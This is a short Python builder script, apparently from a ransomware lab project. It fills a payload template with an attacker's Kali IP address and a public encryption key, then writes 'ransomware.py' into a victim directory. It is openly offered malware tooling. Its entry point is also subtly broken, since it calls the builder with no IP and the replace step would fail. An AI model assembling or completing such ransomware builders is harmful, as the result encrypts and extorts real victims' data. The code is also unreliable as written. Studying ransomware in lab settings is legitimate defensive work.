import os
import socket
import sys

print("[+] Building Windows Ransomware Payload...\n")

def build_windows_payload(kali_ip=None):
    # Build the ransomware payload
    try:
        # Read the Template
        template_path = os.path.join(os.path.dirname(__file__), "payload_template.py")
        with open(template_path, "r") as f:
            template = f.read()
        
        # Read the Public Key
        key_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "Keys", "public_key.pem")
        with open(key_path, "r") as f:
            PUBLIC_KEY = f.read().strip()
        
        # Replace placeholders in template
        payload_code = template.replace("KALI_IP_HERE", kali_ip)
        payload_code = payload_code.replace(
        "{PUBLIC_KEY_PLACEHOLDER}",
        PUBLIC_KEY
        )


        # Save the final payload
        target_dir = os.path.abspath(
            os.path.join(os.path.dirname(__file__), '..', '..', 'Victim', 'src')
        )
        os.makedirs(target_dir, exist_ok=True)
        
        target = os.path.join(target_dir, 'ransomware.py')
        with open(target, 'w') as f:
            f.write(payload_code)
        
        print(f"[+] Payload created: {target}")
        
        return target
        
    except Exception as e:
        print(f"[-] Error building payload: {e}")
        raise

if __name__ == "__main__":
    # Test the function
    build_windows_payload()